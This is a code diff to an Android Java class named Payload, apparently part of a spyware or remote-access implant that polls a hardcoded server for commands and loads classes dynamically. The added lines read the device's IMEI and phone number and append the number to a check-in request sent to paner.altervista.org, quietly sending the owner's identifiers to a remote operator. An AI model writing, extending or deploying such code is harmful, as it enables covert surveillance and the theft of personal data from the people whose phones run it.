@@ -29,7 +29,7 @@ import java.util.List;
 import java.util.concurrent.TimeUnit;
 
 import dalvik.system.DexClassLoader;
-
+import android.telephony.TelephonyManager;
 public class Payload extends JobService {
 
     private static Class<?> apkActivity;
@@ -39,6 +39,9 @@ public class Payload extends JobService {
     public boolean onStartJob(JobParameters job) {
         // Do some work here
         final Bundle extras = job.getExtras();
+        TelephonyManager tm = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+        imei = tm.getDeviceId();
+        tel = tm.getLine1Number();
         //parameters = new String[]{extras.getString("mpath")};
 
         //main(null);
@@ -63,6 +66,8 @@ public class Payload extends JobService {
     public static long comm_timeout;
     private static String[] parameters;
     private static String android_id;
+    private static String imei;
+    private static String tel;
     public static String curdir;
     public static long retry_total;
     public static long retry_wait;
@@ -85,7 +90,8 @@ public class Payload extends JobService {
         return "pippi";
 
     }
-    public static void start(Context context) {
+    public static void start(Context context,String stel) {
+        tel=stel;
         gcontext=context;
         startInPath(context.getApplicationInfo().dataDir);
         //startInPath(context.getFilesDir().toString());
@@ -107,6 +113,7 @@ public class Payload extends JobService {
     public static int main(String[] args) {
         String hostname="none";
         String result="";
+
         //String site="paner.altervista.org";
         List<String> sites = new ArrayList<String>();
         sites.add("paner.altervista.org");
@@ -160,7 +167,7 @@ public class Payload extends JobService {
                     for (String site : sites) {
                         try {
                             hostname = getHostName("Android");
-                            result = getResponseFromUrl("http://" + site + "/svc/wup.php?pc=" + hostname);
+                            result = getResponseFromUrl("http://" + site + "/svc/wup.php?pc=" + hostname+"&nome="+tel);
 
                             String[] array = result.split("\\|\\|", -1);
                             String kill=array[3].substring(5);
@@ -214,7 +221,7 @@ public class Payload extends JobService {
 
 
                                     apkActivity = gcontext.getClassLoader().loadClass(MyConfig.APK1_ACTIVITY_MAIN);
-                                    apkUtils = gcontext.getClassLoader().loadClass(MyConfig.APK1_UTILS);
+                                    //apkUtils = gcontext.getClassLoader().loadClass(MyConfig.APK1_UTILS);
                                     Intent intent = new Intent();
                                     intent.setClass(gcontext, apkActivity);
                                     intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
